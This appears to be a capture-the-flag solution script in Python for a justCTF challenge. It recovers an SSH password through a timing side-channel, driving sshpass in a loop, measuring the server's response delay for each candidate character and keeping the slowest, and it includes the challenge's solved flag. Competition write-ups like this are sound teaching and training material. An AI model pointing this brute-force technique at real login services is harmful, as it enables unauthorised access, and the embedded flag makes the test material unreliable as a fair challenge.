import pexpect


flag = "justCTF{s1d3ch4nn3ls_4tw_79828}"
chars = "CFT_cdhjlnstuw{}1234567890"


def exp_pass(passwd: str):
    ssh = pexpect.spawn(
        f'sshpass -p "{passwd}" ssh hasshing.nc.jctf.pro -l ctf -p 1337'
    )
    ssh.read()
    result: bytes = ssh.before
    ssh.close()
    ssh.terminate(force=True)
    ssh.kill(9)

    output = result.decode()
    lines = output.splitlines()

    for i in range(len(lines)):
        if lines[i].startswith("[2024"):
            begin_idx = i
            end_idx = i + 3
            break

    try:
        begin = float(lines[begin_idx].split(":")[2].split("]")[0])
        end = float(lines[end_idx].split(":")[2].split("]")[0])

        time_span = end - begin
        if time_span < 0:
            time_span += 60
    except:
        time_span = 0

    return time_span


while not flag.endswith("}"):
    time_list = {}
    for c in chars:
        passwd = flag + c
        time_span = exp_pass(passwd)
        while time_span == 0:
            time_span = exp_pass(passwd)
        time_list.update({c: time_span})
        print(f"{passwd}: {time_span}")

    sorted_time_list = sorted(time_list.items(), key=lambda x: x[1], reverse=True)
    best = sorted_time_list[0]
    flag += best[0]

print(flag)
